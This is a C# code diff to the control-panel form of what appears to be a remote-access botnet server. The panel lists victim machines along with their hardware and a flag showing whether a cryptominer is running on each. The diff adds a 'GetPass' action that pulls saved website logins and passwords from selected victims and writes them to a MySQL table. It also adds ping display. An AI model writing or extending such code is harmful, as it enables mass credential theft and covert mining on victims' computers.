@@ -12,6 +12,7 @@ using System.IO;
 using System.Net.Sockets;
 using System.Threading;
 using ServerWorker.Server;
+using Interfaces;
 
 namespace ServerWorker
 {
@@ -45,11 +46,11 @@ namespace ServerWorker
                 if (Program.form1.InvokeRequired) Program.form1.BeginInvoke(new Action(() => { Program.form1.Form1_InterfaceChanged(arg); }));
                 else Program.form1.Form1_InterfaceChanged(arg);
             };
-            Program.server.Events.OnConnected += UpdateClientList;
-            Program.server.Events.OnDisconnect += UpdateClientList;
+
             Program.server.Events.OnAuthorized += UpdateClientList;
             UserCard.UserData.OnDataUpdate += UpdateClientList;
-
+            Program.server.Events.OnConnected += (User user) => { user.OnPingUpdate += UpdatePing; UpdateClientList(); };
+            Program.server.Events.OnDisconnect += (User user) => { user.OnPingUpdate -= UpdatePing; UpdateClientList(); };
             InitContextMenuStrip();
             mainControls.Add(button1);
             secondControls.Add(button8);
@@ -89,6 +90,16 @@ namespace ServerWorker
                 InputForm userCard = new InputForm(users.ToArray());
                 userCard.Show();
             };
+            menu.Items.Add("GetPass");
+            menu.Items[5].Click += (object sender, EventArgs e) =>
+            {
+                List<User> users = new List<User>();
+                foreach (int index in listView1.SelectedIndices)
+                {
+                    users.Add(ServerNet.ConnectedUsers.ToArray()[index]);
+                }
+                GetPass(users);
+            };
         }
 
         private void DisconnectCurrentUsers()
@@ -102,6 +113,7 @@ namespace ServerWorker
                 }
             }
         }
+
         private void UpdateClientList()
         {
             listView1.BeginInvoke(new Action(() =>
@@ -125,6 +137,11 @@ namespace ServerWorker
 
         }
 
+        public void UpdatePing(User user)
+        {
+            listView1.BeginInvoke(new Action( () => listView1.Items[ServerNet.ConnectedUsers.IndexOf(user)].SubItems[7].Text = user.Ping.ToString()));
+        }
+
         private void DrawUser(User user)
         {
             string[] raw;
@@ -136,7 +153,9 @@ namespace ServerWorker
                 user.userData.setting.Comp_name ?? "",
                 user.EndPoint.ToString(),
                 "",
-                user.userData.IsWorkinMiner.ToString()
+                user.userData.IsWorkinMiner.ToString(),
+                user.userData.IsGettingLoginData ? "V" : "",
+                user.Ping.ToString()
                 };
                 if (user.userData.infoDevice.GPUVideoProcessor.Count > 0)
                 {
@@ -149,7 +168,10 @@ namespace ServerWorker
                 user.UserType.ToString(),
                 "",
                 "",
-                user.EndPoint.ToString()
+                user.EndPoint.ToString(),
+                "",
+                "",
+                ""
                 };
             }
                 ListViewItem viewItem = new ListViewItem(raw);
@@ -222,6 +244,34 @@ namespace ServerWorker
             catch (Exception ex)
             {
                 Log.Send("Form1_FormClosing " + ex.Message);
+            }
+        }
+
+        private void GetPass(List<User> users)
+        {        
+            foreach (User user in users)
+            {
+                var loginDataList = user.UsersCom.SendLoginData("");
+                MySQLData data = new MySQLData() { Table = "LoginData", Columns = new string[] { "Site", "Login", "Password", "UserId" } };
+                foreach (LoginData loginData in loginDataList)
+                {
+                    if (!string.IsNullOrWhiteSpace(loginData.WebSite) || !string.IsNullOrWhiteSpace(loginData.Login) || !string.IsNullOrWhiteSpace(loginData.Pass))
+                        data.Values.Add(new string[] { loginData.WebSite, loginData.Login, loginData.Pass, user.userData.id });
+                }
+
+                var dataCount = data.Values.Count;
+                if (dataCount > 0)
+                {
+                    MySQLManager.Send(data);
+
+                }
+                else MessageBox.Show("Паролей не найдено");
+
+                user.userData.IsGettingLoginData = true;
+                if (user.userData.id != "")
+                    user.userData.SaveDataToFile(user.userData.id + ".xml");
+
+                if (dataCount > 0) MessageBox.Show("Получено строк: " + dataCount);
             }
         }
 
